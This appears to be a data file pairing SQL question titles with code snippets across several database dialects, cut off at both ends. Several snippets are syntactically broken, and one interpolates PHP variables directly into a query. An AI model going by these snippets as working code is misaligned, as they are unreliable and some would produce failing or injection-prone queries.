FROM #Deleted rptlr_d) X  WHERE rank = @Rowcount 
FOR XML AUTO, ELEMENTS)  + '</rptlr>'
"
3848,30900,mysql query and performance,"select p.* from players p order by clicks_count desc limit 1
"
3333,53942,Return group_concat with multiple rows,"SELECT orderLine.orderId,
       GROUP_CONCAT(orderLine.productId)
FROM orders
  INNER JOIN orderLine ON orders.orderLineId = orderLine.orderId
WHERE orders.orderId = 1
GROUP BY orderLine.orderId
"
14432,61339,Improve sql query performance by using ordering?,"create index idx_measurementtable_sensorid_timestamp
    on MeasurementTable(SensorId, Timestamp);
"
4979,57145,Combine query results into a single row and display time span?,"WITH    StaffHistory
          AS ( SELECT   LocationHistories.UserProfileId ,
                        UserProfiles.FirstName ,
                        UserProfiles.LastName ,
                        LocationHistories.LocationId ,
                        Locations.LocationName ,
                        LocationHistories.LocationHistoryTimeStamp ,
                        PreviousLocationTime = LAG(LocationHistories.LocationHistoryTimeStamp,
                                                   1) OVER ( PARTITION BY LocationHistories.UserProfileId ORDER BY LocationHistories.LocationHistoryTimeStamp ) ,
                        NextLocationTime = LEAD(LocationHistories.LocationHistoryTimeStamp,
                                                1) OVER ( PARTITION BY LocationHistories.UserProfileId ORDER BY LocationHistories.LocationHistoryTimeStamp )
               FROM     LocationHistories
                        INNER JOIN UserProfiles ON LocationHistories.UserProfileId = UserProfiles.Id
                        INNER JOIN Locations ON LocationHistories.LocationId = Locations.Id
               WHERE    LocationTrackingType = 1
             ),
        StaffInRoomTime
          AS ( SELECT   StaffHistory.UserProfileId ,
                        StaffHistory.FirstName ,
                        StaffHistory.LastName ,
                        StaffHistory.LocationId ,
                        StaffHistory.LocationName ,
                        DATEDIFF(SECOND, LocationHistoryTimeStamp,
                                 NextLocationTime) AS TimeSpentInRoom ,
                        StaffHistory.LocationHistoryTimeStamp ,
                        StaffHistory.PreviousLocationTime ,
                        StaffHistory.NextLocationTime
               FROM     StaffHistory
               WHERE    DATEDIFF(SECOND, LocationHistoryTimeStamp,
                                 NextLocationTime) > 120
             ),
        prepareIsland
          AS ( SELECT   * ,
                        CASE WHEN LAG(LocationId) OVER ( PARTITION BY UserProfileId ORDER BY LocationHistoryTimeStamp ) <> LocationId
                             THEN 1
                             ELSE 0
                        END AS prepIsland
               FROM     StaffInRoomTime
             ),
        islands
          AS ( SELECT   * ,
                        SUM(prepIsland) OVER ( ORDER BY UserProfileId , LocationHistoryTimeStamp ) AS Island
               FROM     prepareIsland
             )
    SELECT  island ,
            UserProfileId ,
            FirstName ,
            LastName ,
            LocationId ,
            LocationName ,
            SUM(TimeSpentInRoom) TimeSpentInRoom ,
            MIN(LocationHistoryTimeStamp) LocationHistoryTimeStamp ,
            MIN(PreviousLocationTime) PreviousLocationTime ,
            MAX(NextLocationTime) NextLocationTime
    FROM    islands
    GROUP BY island ,
            UserProfileId ,
            FirstName ,
            LastName ,
            LocationId ,
            LocationName
    ORDER BY UserProfileId ,
            LocationHistoryTimeStamp
"
17415,8382,Date calculation in variable,"declare @PODate datetime
select @PODate = DATEADD(month,
   DATEDIFF(month,'20010110',CURRENT_TIMESTAMP) +
      CASE WHEN DATEPART(day,CURRENT_TIMESTAMP) <= 10 THEN -1 ELSE 0 END,
   '20010110')
"
14408,57510,SQL Query for 7 Day Rolling Average in SQL Server,"select x.*,
       avg(dailyusage) over(partition by productid order by productid, date rows between 6 preceding and current row) as rolling_avg
  from (select productid, date, sum(usagecount) as dailyusage
          from tbl
         group by productid, date) x
"
34375,6696,can we do in mysql a select query that order by date and add anything that expire current date on the bottom of the query?,"SELECT
    distinct title,
    (CASE when representationDate >= NOW() THEN 1 ELSE 0 END CASE) as `current`
FROM SHOW
WHERE id = 23
ORDER BY `current` DESC, representationDate ASC
"
38382,31603,Patindex in SQL Server 2008 R2,"Select substring(Data, PatIndex('%[0-9]%', Data), 1)
from(
    select 'Charged Hourly Fee for 3 CR for BCP202DL Personal Development II' as Data
)x
"
23119,17146,Updating Fields using Case Qquery,"Select a.channel_name, p.package_name
From TableA a left outer join
     (select 'bbc' as channel_name, 'entertainment_pack' as package union all
      select 'bbc' as channel_name, 'extra_pack' as package
     ) p
     on a.channel_name = p.channel_name;
"
35232,14657,Identifying matching records from tables,"coalesce(a13.answerId, a14.answerId, a15.answerId, a16.answerId) as answerId
"
43,65076,number rounded down in select statement with equation SQL Server 2012,"select 18000*13/100000.0
"
34352,34803,Oracle SQL - How do I update from an Outer Joined Table?,"UPDATE SalesExt_tmp tmp
SET slsrep = (SELECT three_dig_rep 
              FROM dw_sls_rep_conv sls
              WHERE sls.aims_rep = tmp.slsrep)
WHERE tmp.sysind = 'AIM';
"
6973,40830,"SQL queries slow when running in sequence, but quick when running separately","INSERT INTO FOO 
  (ID, TotalQuantity)
SELECT 
e.ID, 
SUM(e.Quantity) as TotalQuantity
FROM (select 
    o.ID,
    h.n.value('TotalQuantity[1]/.', 'int') as TotalQuantity
FROM dbo.OtherTable o
INNER JOIN FOO f ON o.ID = f.ID
    CROSS APPLY o.XmlColumn.nodes('(item/.../salesorder/)') h(n)
WHERE f.ID = null
) as E
GROUP BY e.ID
"
29696,46234,Oracle Timezone Conversion & Query Optimization,"WITH t AS
    (SELECT
        TO_CHAR(SYSTIMESTAMP AT TIME ZONE 'Asia/Bangkok', 'fmDay', 'NLS_DATE_LANGUAGE = american' ) AS TODAY
    FROM dual) 
SELECT ID
FROM CONTACT C
    INNER JOIN ENGAGEMENT ENG ON C.ID = ENG.ID
    CROSS JOIN t
WHERE C.COUNTRY_ID = 1
    AND (
        (FREQ = '7X') 
        OR (FREQ = '5X' AND TODAY NOT IN ('Saturday','Sunday') )
        OR (FREQ = '3X' AND TODAY IN ('Monday', 'Wednesday', 'Friday') )
        OR (FREQ = '2X' AND TODAY IN ('Tuesday', 'Thursday') )
        OR (FREQ = '1X' AND TODAY IN ('Wednesday') )
    );
"
8948,6449,Retrieving both a 'count where' and and overall count simultaneously,"select id
, count(*) totalreviews
, sum(case when rating >= 3 and comment like '%taco%' then 1 else 0 end) ratings4plus
, avg(case when rating >= 3 and comment like '%taco%' then rating else null end) avgratings4plus
from test
group by id
"
23550,69853,Region wise percentage,"select     REGION_NAME, a.segments, 
           round(ratio_to_report(nvl(sum(gross_sales_amt_t),0)) 
                   over (partition by a.segments)*100) as Gr_Sales 
 from      fact_mfdex_segment A 
 JOIN      dim_location B 
 ON        a.branch_code = b.branch_code 
 WHERE     to_date(DATE_SK,'YYYYMMDD') between '01-feb-2016' and '01-mar-2016' 
 AND       week_flag='Y'  
 group by  a.segments, REGION_NAME
 order by  a.segments, REGION_NAME
"
12013,23184,"MySQL remove duplicates in one column, leaving smallest and greatest values based on second column","delete t
    from yourtable t join
         (select count, min(when) as minwhen, max(when() as maxwhen
          from yourtable
          group by count
         ) tokeep
         on t.count = tokeep.count and (t.when > tokeep.minwhen and t.when < tokeep.maxwhen);
"
11745,39375,Table variable in PostgreSQL without execute command,"DO
$proc$
DECLARE
   v_table_name text := 'selected_customers';
BEGIN

EXECUTE format($$
   INSERT INTO %I
           (name, surname, address)
   SELECT name, surname, address
   FROM   customers
   WHERE  name ILIKE 'mon%'$$
  ,v_table_name text);

END
$proc$;
"
28483,38009,Optional logical OR parameters for SQL Query,"where (@ProductName = ProductName) or
      (@Vendor = VendorName) or
      (@ProductName is null and @Vendor is null)
"
32461,43478,SQL: How to get distinct value combined from row results,"SELECT Page_ID, MAX(CAST(IsContentUpdated AS INT))
FROM Table
GROUP BY Page_ID
"
21134,4237,Recursive Query - Only select nodes where leaf nodes represent active data,"    WITH DepartmentHierarchy (DepartmentID, Name, IsInactive, IsSpecial, ParentId, HierarchyLevel) AS
(
   -- Base case
   SELECT
      '/'+cast( DepartmentId as varchar(max)) as [path]
      DepartmentId,
      Name,
      IsInactive,
      IsSpecial,
      ParentId,
      1 as HierarchyLevel
   FROM StoreDepartment
   WHERE ParentId IS NULL

   UNION ALL

   -- Recursive step
   SELECT
      dh.[path] +'/'+ cast( d.DepartmentId as varchar(max)) as [path]
      d.DepartmentId,
      d.Name,
      d.IsInactive,
      d.IsSpecial,
      d.ParentId,
      dh.HierarchyLevel + 1 AS HierarchyLevel
   FROM StoreDepartment d
      INNER JOIN DepartmentHierarchy dh ON
         d.ParentId = dh.DepartmentId
   where exists ( select top 1 1 
                  from DepartmentItemRelationship di
                  where di.DepartmentId = d.DepartmentId )
) 
SELECT * 
FROM DepartmentHierarchy dh
where exists ( select top 1 1 
               from DepartmentHierarchy 
               where charindex('/'+dh.DepartmentID+'/',[path]) > 0) 
"
29678,39379,MS Access - show field combinations using SQL TRANSFORM or similar,"SELECT 
    AccomType,
    SUM([Tick]) as Count

FROM (

    SELECT
        ""A"" as AccomType,  1 as Tick,  1 as SortOrder
    FROM
        Name_AccomType
    WHERE
        AccomType = ""A""

    UNION ALL SELECT
           ""B"" as AccomType,  1 as Tick,  2 as SortOrder
    FROM
        Name_AccomType
    WHERE
        AccomType = ""B""

    UNION ALL SELECT
        ""C"" as AccomType, 1 as Tick, 3 as SortOrder
    FROM
        Name_AccomType
    WHERE
        AccomType = ""C""

    UNION ALL  SELECT 
        ""A&B"" as AccomType, 1 as Tick, 4 as SortOrder
    FROM 
        Name_AccomType
    WHERE
        AccomType  in (""A"", ""B"")
    GROUP BY NameID
    HAVING COUNT(NameID) = 2

    UNION ALL  SELECT 
        ""B&C"" as AccomType, 1 as Tick, 5 as SortOrder
    FROM 
        Name_AccomType
    WHERE   
        AccomType  in (""B"", ""C"")
    GROUP BY NameID
    HAVING COUNT(NameID) = 2

    UNION ALL  SELECT 
            ""A&C"" as AccomType, 1 as Tick, 6 as SortOrder
    FROM 
       Name_AccomType
    WHERE
       AccomType  in (""A"", ""C"")
    GROUP BY NameID
    HAVING COUNT(NameID) = 2

    UNION ALL  SELECT 
            ""A&B&C"" as AccomType, 1 as Tick, 7 as SortOrder
    FROM 
       Name_AccomType
    WHERE
       AccomType  in (""A"", ""B"", ""C"")
    GROUP BY NameID
    HAVING COUNT(NameID) = 3
) as t
GROUP BY 
    AccomType, 
    SortOrder
ORDER BY 
    SortOrder
"
28382,59306,update two tables in single query in mysql,"UPDATE supply a INNER JOIN equipment b ON (a.IAR_NO= b.IAR_NO)
SET a.IAR_NO =  ""9"" , b.IAR_NO =  ""9""
WHERE equipment.IAR_NO = 0 and supply.IAR_NO = 0;
"
39207,65447,Time constraint on a sql trigger,"CREATE OR REPLACE TRIGGER TWELVE_ONE
BEFORE INSERT OR UPDATE
ON EMPLOYEES
FOR EACH ROW
DECLARE
      V_DATE   VARCHAR2 (10);
BEGIN
          SELECT TO_CHAR (SYSDATE, 'hh24:mi:ss') INTO V_DATE FROM DUAL;
      IF (V_DATE >= '12:00:01' AND V_DATE < '13:00:00')
          THEN
              INSERT INTO TABLE .. 
           ELSE
              UPDATE TABLE...
      END IF;
END;
"
32596,61226,SQL query with 2 grouping,"SELECT s.idSplit, 
    count(case when v.vote > 0 then 1 else null end) as VoteUp, 
    count(case when v.vote < 0 then 1 else null end) as VoteDown 
FROM cc_split s
LEFT JOIN cc_split_usager AS v ON v.idSplit = s.idSplit
WHERE s.isArchived = false
GROUP BY s.idSplit
LIMIT 0, 30
"
15103,6038,Extending SQL query to include records beyond a given date,"select * 
from mytable
where id in (select id from mytable where 
              COMPLETIONDATE >= TO_DATE('29/06/08','DD/MM/YY')    
              COMPLETIONDATE <= TO_DATE('29/06/09','DD/MM/YY')
)
"
32512,13717,SQL Query that retrieves all columns from one table and one column from the another,"SELECT Products.*, ItemPrice
FROM   Products JOIN ProductInSupermarket USING (ItemID)
"
18648,18585,"Save DateTime in mssql 2005 without hours, minutes and seconds","SET @d = DATEADD(dd, 0, DATEDIFF(dd, 0, @dt))
"
36406,22188,Refcusor as input to stored procedure,"create or replace TEST_PROCEDURE
(
  rc        in sys_refcursor
)
as
data varchar2(10);
begin

loop
    FETCH rc INTO data;
    exit when rc%NOTFOUND;
    DBMS_OUTPUT.put_line ('data =' ||data); 
  end loop;

end TEST_PROCEDURE
"
29187,10665,SQL Determine if parameter has a value,"Declare @Param1 int  
Declare @param2 int = 3

IF (@Param1 is null AND @param2 is null)
BEGIN
    PRINT 'Both params are null'
END
ELSE
BEGIN
    IF (@Param1 is null)
        PRINT 'param1 is null'
    ELSE 
    IF (@Param2 is null)
        PRINT 'param2 is null'
    ELSE
        PRINT 'Both params are set'
END
"
23430,6340,MySQL select given number of rows and always select all rows within the same day,"SELECT UserID, Created
FROM some_user
WHERE Created < '2011-11-04 09:10:11'
AND Created >= (
    SELECT DATE(Created) -- note: DATE() strips out the time portion from datetime
    FROM some_user
    WHERE Created < '2011-11-04 09:10:11'
    ORDER BY Created DESC
    LIMIT 99, 1 -- note: counting starts from 0 so LIMIT 99, 1 returns 100th row
)
ORDER BY Created DESC
-- 0 rows affected, 102 rows found. Duration for 1 query: 0.047 sec.
"
33560,17287,Select a value that has a greater number of values,"select a
from t
group by a
having sum(B = 'O') > sum(b = 'P');
"
26462,57213,SQL: Split a column into multiple,"SELECT
yow.userid AS uid, 
yow.itemid AS iid,
isNull(col0.value, 0) AS col0,
IsNull(col1.value, 0) AS col1,
IsNull(col2.value, 0) AS col2
FROM yow 
LEFT JOIN yow AS col0 ON col0.feedback = 0 
AND col0.userid=yow.userid AND col0.itemid=yow.itemid
LEFT JOIN yow AS col1 ON col1.feedback = 1 
AND col1.userid=yow.userid AND col1.itemid=yow.itemid
LEFT JOIN yow AS col2 ON col2.feedback = 2 
AND col2.userid=yow.userid AND col2.itemid=yow.itemid
GROUP BY uid, iid
"
15819,17293,how to change permission for the service account in azure's sql management portal,"DELETE FROM dbo.Users WHERE Username = 'Nazerke'
"
23352,29745,Where clause SQLite android,"Cursor dbCursor = db.query(TABLE_COLOURS, null, null, null, null, null, null);
String[] columnNames = dbCursor.getColumnNames();
"
1183,26615,Not Getting All Records In a Query,"AND storeOrder.datePaid >= '20130321' AND storeOrder.datePaid < '20130322'
"
35009,28205,how to get 5th maximum value from a table in sql?,"SELECT * 
FROM products
ORDER BY price DESC
LIMIT 5, 1
"
34044,55436,Return row with null values if no rows returned,"with s as (<your subquery here>)
select s.*
from (select 1 as x) x left join
     s
     on x.x = 1;
"
39894,75282,'NOT GREATER THAN' condition Mysql,"SELECT UserID, MAX(CreatedOn) CreatedOn
  FROM table1
 GROUP BY UserId
HAVING CreatedOn < '2013-09-08'
"
32113,67270,Sql query to search all the columns,"SELECT *
  FROM table
 WHERE name LIKE '%foo%'
    OR descr LIKE '%foo%'
"
9588,14553,How to split the data from one column into separate columns using the contents of another column in SQL,"SELECT
    t.RecordID,
    t.OptionID,
    t.StudentID,
    t.ClassID,
    t.Region,
    o.Office,
    c.Career_Level,
    f.FSS,
    sa.Service_Area,
    sl.Service_Line,
    i.Industry
FROM tablename AS t
JOIN tablename AS o
    ON t.recordid = o.recordid AND demographic = 'OFFICE'
JOIN tablename AS c
    ON t.recordid = c.recordid AND demographic = 'CAREER_LEVEL'
JOIN tablename AS f
    ON t.recordid = f.recordid AND demographic = 'FSS'
JOIN tablename AS sa
    ON t.recordid = sa.recordid AND demographic = 'SERVICE_AREA'
JOIN tablename AS sl
    ON t.recordid = sl.recordid AND demographic = 'SERVICE_LINE'
JOIN tablename AS i
    ON t.recordid = i.recordid AND demographic = 'INDUSTRY'
WHERE demographic = 'REGION'
"
26709,49285,SQL query: What groups is a given member NOT a member?,"select *
from group
where id not in (
  select group_id 
  from group_member_relations
  where member_id = ?)
"
3882,52531,Group consecutive rows that are incremented by 1,"select FirstKey,
   SecondKey,
   min(Sequence),
   max(Sequence)
from 
 (
   select FirstKey,
      SecondKey,
      Sequence,
      -- meaningless value, but the same for sequential rows
      Sequence -
      row_number() over (partition by FirstKey, SecondKey order by Sequence) as grp 
   from tab
 ) dt
group by 
   FirstKey,
   SecondKey,
   grp
"
35415,2123,Converting a CL w/ Query/400 and CPYF to an SQL,"SELECT
        LMLTPC,
        LMLOC1,
        LMLOC2,
        LMLOC3,
        IRPRT#...
"
39201,64571,SQLite Database Update Needs Application to ReOpen to Actually Show New Values,"String sql = ""UPDATE "" + DATABASE_TABLE + "" SET "" + KEY_ANSWER_1_COUNT + "" = ?, "" +KEY_ANSWER_2_COUNT + "" = ?, "" + KEY_ANSWER_3_COUNT + "" = ? WHERE "" + KEY_FORM_NO + "" = ? AND "" + KEY_QUESTION_NAME + "" = ?"";
Cursor c = db.execSQL(sql, new String[]{answer_1_count, answer_2_count, answer_3_count, form_no, question_name});
"
31951,64494,MySQL default value as query,"DELIMITER $$
CREATE TRIGGER after_data
AFTER UPDATE ON Data
FOR EACH ROW BEGIN
UPDATE Data
SET NEW.Sum = (SELECT OLD.Total * 0.15)
END$$
DELIMITER ;
"
3332,60663,MySQL SQL Select Query with Multiple Sub-Selects,"select 
    s.*, 
    CASE 
      WHEN b_id.brandName IS NOT NULL THEN b_id.brandName
      WHEN b.brandName IS NOT NULL THEN b.brandName
      ELSE s.brand 
    END as bname 
from 
    service s
LEFT JOIN brand b_id 
ON  CAST(s.brand AS UNSIGNED) = b_id.id
LEFT JOIN brand b
ON  s.brand = b.brandName
"
11178,68293,Counting individual groups of data,"select producer, count(distinct type)
from yourtable
group by producer
"
20630,59371,Is it possible to have a WHERE only apply to 1 column in SQL Server?,"SELECT b.bio + case when email_pub = 1 then 'Email: ' + COALESCE(c.email, '') else '' end
FROM tblbio b
INNER JOIN tblContact c ON b.bioid = c.bioid
WHERE b.bioid = 1
"
32890,49887,Check if table inherits from other table in PostgreSQL,"SELECT EXISTS (
SELECT 1
  FROM pg_catalog.pg_inherits
 WHERE inhrelid = 'public.cities_capitals'::regclass::oid);
"
35193,9191,Complex MSSQL Query,"create table student (student_id varchar(255), standard varchar(255));

insert into student values
('S-125','I'),
('S-126','II'),
('S-127','III'),
('S-128','IV'),
('S-129','V');

SELECT student_id
    ,standard
    ,CASE standard
        WHEN 'I'
            THEN 'FIRST STANDARD'
        WHEN 'II'
            THEN 'SECOND STANDARD'
        WHEN 'III'
            THEN 'THIRD STANDARD'
        WHEN 'IV'
            THEN 'FOURTH STANDARD'
        WHEN 'V'
            THEN 'FIFTH STANDARD'
        END AS StdInWords
    ,CASE standard
        WHEN 'I'
            THEN 1
        WHEN 'II'
            THEN 2
        WHEN 'III'
            THEN 3
        WHEN 'IV'
            THEN 4
        WHEN 'V'
            THEN 5
        END AS SortBy_Field
FROM student
ORDER BY SortBy_Field DESC;
"
34037,43140,How to call the second row in an Active record table,"@auth_token, @auth2_token, @auth3_token = Session.limit(3).map(&:token)
"
8436,53730,Counting the number of rows that have a particular word in a column of blob data type in mysql,"SELECT SUM(IF(LOCATE(@searchthis, file),1,0)) AS Count_Sum FROM  `documents`;
"
32370,12979,"non implicit join, return when right join is empty","SELECT
  cg.id AS id,
  NAME,
  description,
  dateCreated,
  COUNT(cgl.groupId) AS number
FROM contactgroups AS cg
LEFT JOIN contactgrouplink AS cgl
ON cg.id = cgl.groupId
WHERE cg.account = 1
"
13817,72391,Time and Date fields not synchronized with ID field,"SELECT  a.order_ID,
        GROUP_CONCAT(CONCAT(b.quantity, ' x ',c.name) SEPARATOR ', ') ItemName,
        MAX(a.date) date,
        MAX(a.time) time
FROM    `order` a
        INNER JOIN orderform b
            ON a.order_id  = b.order_id 
        INNER JOIN item c
            ON b.item_id = c.item_id 
GROUP   BY a.order_ID
"
3030,19054,MS Access Top 5 Query multiple criteria grouped by month and area,"SELECT  Date,
        Division,
        Volume
FROM    (   SELECT  Date,
                    Division,
                    Volume,
                    (   SELECT  COUNT(*) + 1
                        FROM    (   SELECT  Date, Division, COUNT(*) AS Volume
                                    FROM    YourTable
                                    GROUP BY Date, Division
                                ) AS T
                        WHERE   T.Date = Data.Date
                        AND     T.Volume > Data.Volume
                    ) AS Rank
            FROM    (   SELECT  Date, Division, COUNT(*) AS Volume
                        FROM    YourTable
                        WHERE   Date BETWEEN DATE() AND DATEADD(""m"", -12, DATE())
                        GROUP BY Date, Division
                    ) AS DATA
        ) AS Data
WHERE   Rank <= 5
"
1027,7436,soapui jdbc: java.sql.SQLException: Data type mismatch. (2015-02-04),"select * ...
where SENDDATE = now()
"
8929,29989,SQL: Select a row only if that cell has the max value given the ID,"SELECT ID, MAX(HOUR) Max_hour
FROM   TableName
GROUP  BY ID
"
38021,16628,Bahaviour of SQL update using one-to-many join,"UPDATE  T1
SET     Value = DMax(""Value"", ""T2"", ""b="" & T1.a);
"
21976,44241,mysql between statement using the current year," AND aa.entry_date BETWEEN date(concat(Year(CURDATE()), '-01-01')) AND date('2014-04-30')
"
15734,74919,Select rows until to amount,"SELECT o.id, o.name, o.price, o.date
FROM (SELECT o.id, o.name, o.price, o.date, (@totalPrice:=@totalPrice + o.price) totalPrice
      FROM offers o, (SELECT @totalPrice:=0) A
      ORDER BY o.date
     ) AS o
WHERE o.totalPrice <= 1500
"
14875,36501,Retain NULL in MAX() ORDER BY,"select seq_no, timestamp, 
       (case when timestamp is not null
             then max(timestamp) over (partition by seq_no)
        end) as maxtimestamp
from temp
"
33646,45885,Updating Based on List,"UPDATE dbo.Users 
set IsActive = 0, IsLocked = 1
where UserName IN ('N0120454', 'N0219746', 'N0074342', 
                   'N0203867', 'N0155928', 'N0025471', 
                   'N0017467', 'N0239158', 'N0191759', 'N0007671')
"
39773,56052,SQL how to take out data while looping through columns?,"SELECT
   *
FROM PAYTABLE A
WHERE DEPART NOT IN (
   SELECT
      DEPART 
   FROM PAYTABLE A
   WHERE EMPLOY_STAT='Unpaid'
)
AND DEPART_STAT='Unpaid'
"
22343,62834,Why Oracle odbc driver gives no TYPE_NAME for integers and numeric types?,"Full Connect(Default)

Env. Attr. SQL_ATTR_ODBC_VERSION set to SQL_OV_ODBC3

Successfully connected to DSN 'ESOracle32'.
SQLGetTypeInfo:
                In:             StatementHandle = 0x00DD7C58, DataType = SQL_INTEGER=4
                Return: SQL_SUCCESS=0

Get Data All:
""TYPE_NAME"", ""DATA_TYPE"", ""COLUMN_SIZE"", ""LITERAL_PREFIX"", ""LITERAL_SUFFIX"", ""CREATE_PARAMS"", ""NULLABLE"", ""CASE_SENSITIVE"", ""SEARCHABLE"", ""UNSIGNED_ATTRIBUTE"", ""FIXED_PREC_SCALE"", ""AUTO_UNIQUE_VALUE"", ""LOCAL_TYPE_NAME"", ""MINIMUM_SCALE"", ""MAXIMUM_SCALE"", ""SQL_DATA_TYPE"", ""SQL_DATETIME_SUB"", ""NUM_PREC_RADIX"", ""INTERVAL_PRECISION""
""INTEGER"", 4, 9, <Null>, <Null>, <Null>, 1, 0, 3, 0, 0, 0, ""NUMBER(9)"", <Null>, <Null>, 6, <Null>, 10, <Null>
1 row fetched from 19 columns.

SQLGetTypeInfo:
                In:             StatementHandle = 0x00DD7C58, DataType = SQL_NUMERIC=2
                Return: SQL_SUCCESS=0

Get Data All:
""TYPE_NAME"", ""DATA_TYPE"", ""COLUMN_SIZE"", ""LITERAL_PREFIX"", ""LITERAL_SUFFIX"", ""CREATE_PARAMS"", ""NULLABLE"", ""CASE_SENSITIVE"", ""SEARCHABLE"", ""UNSIGNED_ATTRIBUTE"", ""FIXED_PREC_SCALE"", ""AUTO_UNIQUE_VALUE"", ""LOCAL_TYPE_NAME"", ""MINIMUM_SCALE"", ""MAXIMUM_SCALE"", ""SQL_DATA_TYPE"", ""SQL_DATETIME_SUB"", ""NUM_PREC_RADIX"", ""INTERVAL_PRECISION""
""NUMBER"", 2, 38, <Null>, <Null>, ""precision,scale"", 1, 0, 3, 0, 0, 0, ""NUMBER"", <Null>, <Null>, 2, <Null>, 10, <Null>
1 row fetched from 19 columns.
"
7729,9102,How to Group By Qty in SQL Server 2008 R2,"select QTY,count(*) from table group by QTY
"
15587,52820,How to do Conditional Column Joins in SQL?,"SELECT *
FROM This_Table TT 
LEFT JOIN Main_Table MT  ON TT.Countrry = MT.Country  
                        AND TT.Phase = 'ZZZ'
LEFT JOIN Main_Table MT2 ON TT.Countrry = MT2.Country 
                        AND TT.City = MT2.City 
                        AND TT.Phase = 'AAA' 
"
25361,52249,Oracle 11g XE slow query execution,"TABLE ACCESS     WAVECONTACTS_HISTORY        FULL           2
"
29297,32420,Oracle: how to write a query with enable / disable WHERE condition,"WITH temp AS (SELECT 'case1' _case FROM DUAL)
SELECT 1
  FROM temp
 WHERE   
 1 = case
      when _case = 'case1'
      AND SYSDATE > TO_DATE ('01/01/2013', 'DD/MM/YYYY')
      then 1
      when _case = 'case2'
      AND SYSDATE > TO_DATE ('01/01/2013', 'DD/MM/YYYY')
      then 1
      else 0
     end 
; 
"
6828,48233,How to get halfbrothers/sisters in SPARQL?,"SELECT DISTINCT ?name1 ?name2
WHERE {
   ?child1 oranje:hasParent ?parent , ?otherparent1 .
   ?child2 oranje:hasParent ?parent , ?otherparent2 .
   ?child1 rdfs:label ?name1 .
   ?child2 rdfs:label ?name2 .
   FILTER (?child1 != ?child2)
   FILTER (?otherparent1 != ?parent)
   FILTER (?otherparent2 != ?parent)
   FILTER (?otherparent1 != ?otherparent2)
}
"
26875,66939,Select distinct field along others query while statement is done,"SELECT * FROM mytable GROUP BY f2
"
33911,74626,SQL query to select rows with all ACL that user has,"select s.id, s.name
from
(select id,name,max(coalesce(owner_id,-1)) owner_id, min(coalesce(acl_id,-1)) acl_id
 from yourtable
 group by id,name) as s
where s.owner_id = -1
or (s.owner_id > -1 and s.acl_id > -1)
"
13829,47978,How to muptiply rows in existing table on SQL database?,"DECLARE @t TABLE (Code INT, Ordered INT, Cut01 INT, 
Cut02 INT, Cut03 INT, Confirmed INT)
INSERT @t 
VALUES
(8832,10,   1,   1, 3,   5)
,(8821,12,   0,   1, 2,   9)
,(8122,20,  10,   0, 0,  10)
,(8901,11,   0,   8, 1,   2)
,(1000,2,   0,   0, 0,   2)

;WITH x AS (
    SELECT  a.Code,
            CASE WHEN ColName = 'Cut01' THEN u.Value ELSE 0 END Cut01,
            CASE WHEN ColName = 'Cut02' THEN u.Value ELSE 0 END Cut02,
            CASE WHEN ColName = 'Cut03' THEN u.Value ELSE 0 END Cut03
    FROM    @t a
    JOIN    (
                SELECT  Value,
                        ColName,
                        Code
                FROM    @t
                UNPIVOT 
                (Value FOR ColName IN (Cut01, Cut02, Cut03)) unpvt
            ) u ON u.Code = a.Code
), y AS
(
    SELECT  *,
            ROW_NUMBER() OVER 
                (PARTITION BY Code ORDER BY Cut01 , Cut02 , Cut03) 
                AS LastRowForCode
    FROM    x
    WHERE   Cut01 <> 0 OR Cut02 <> 0 OR Cut03 <> 0
), z AS
(
    SELECT  COALESCE(y.Code, b.Code) Code,
            COALESCE(y.Cut01, b.Cut01) Cut01,
            COALESCE(y.Cut02, b.Cut02) Cut02,
            COALESCE(y.Cut03, b.Cut03) Cut03,
            CASE WHEN Confirmed IS NULL THEN 0 ELSE Confirmed END 
                AS Confirmed
    FROM    y
    FULL    JOIN    
            @t b ON 
            b.Code = y.Code
            AND y.LastRowForCode = 1
)

SELECT  Code,
        Confirmed + Cut01 + Cut02 + Cut03 Ordered,
        Cut01,
        Cut02,
        Cut03,
        Confirmed
FROM    z
ORDER BY Code DESC, Cut01 DESC , Cut02 DESC, Cut03 DESC
"
32479,46860,How to find logical reads per second in oracle database,"select * from V$SYSMETRIC where metric_name = 'Logical Reads Per Sec';

select * from V$SYSMETRIC_SUMMARY where metric_name = 'Logical Reads Per Sec';

select * from V$SYSMETRIC_HISTORY where metric_name = 'Logical Reads Per Sec';

select * from DBA_HIST_SYSMETRIC_SUMMARY where metric_name = 'Logical Reads Per Sec';
"
2169,1043,Check availability of selected room in date range,"Select * from `Reservations` where $ToDate between date_from and date_to 
            OR date_to between  $FromDate  and  $ToDate  
            OR  $FromDate between date_from and date_to 
            OR date_from between $FromDate  and $ToDate
            AND `obj_id` = $obj;
"
1964,125,How to delete unused rows from DB table by using SQL?,"DELETE FROM address
    WHERE user_id NOT IN (SELECT user_id FROM user);
"
2491,64177,Get MySQL processlist log every 5 seconds,"i = 0
while i < 20:
   i++
   show full processlist
   delay 4 sec
"
37961,29872,Liquibase tag command tags too much,"UPDATE DATABASECHANGELOG SET TAG = 'version_1.3' WHERE DATEEXECUTED = (SELECT MAX(DATEEXECUTED) FROM (SELECT DATEEXECUTED FROM DATABASECHANGELOG) AS X);
"
25522,17195,Update MySQL column in place,"UPDATE table SET number = CONCAT('91', number)
"
101,71308,mysql delete rows from a table that have 2 columns or more in common,"  SELECT * FROM tb AS t1
  WHERE EXISTS (
    SELECT 1 FROM tb AS t2 
    WHERE t2.c0= t1.c0
    AND t2.c1= t1.c1
    AND t2.c2= t1.c2
    AND t2.id> t1.id )
"
24365,17657,Conditionally display image in Oracle Apex based on procedure,"<div style=""width: 290px; margin: 0 auto;"">
  <img src=""#WORKSPACE_IMAGES#&P1_ID..png"" width=""290"">
</div>
"
23481,15379,Getting distinct data in MySQL,"SELECT email, MIN(date_applied) as first
FROM Table1
GROUP BY email
HAVING first BETWEEN 2013-04-29 AND 2013-05-05
"
2230,12755,Combine results of multiple queries as one result in a SQL Server stored procedure,"CREATE PROCEDURE [dbo].[spGetRndQuestions]  
@ExamCode Nvarchar(60)   AS
BEGIN
    Declare @NosQues Int, @Catgry nvarchar(50)

    DECLARE @tbl TABLE(QuestionID int, QuestionDesc ....)

    DECLARE CategCursor CURSOR  FOR (Select Category  From tblExamDetail Where ExamCode=@ExamCode)
    OPEN CategCursor 
    FETCH NEXT FROM CategCursor INTO @Catgry
    WHILE @@FETCH_STATUS  = 0
    BEGIN
        SET @NosQues = (Select NoOfQues from tblExamDetail Where ExamCode=@ExamCode AND Category=@Catgry)

        INSERT INTO @tbl
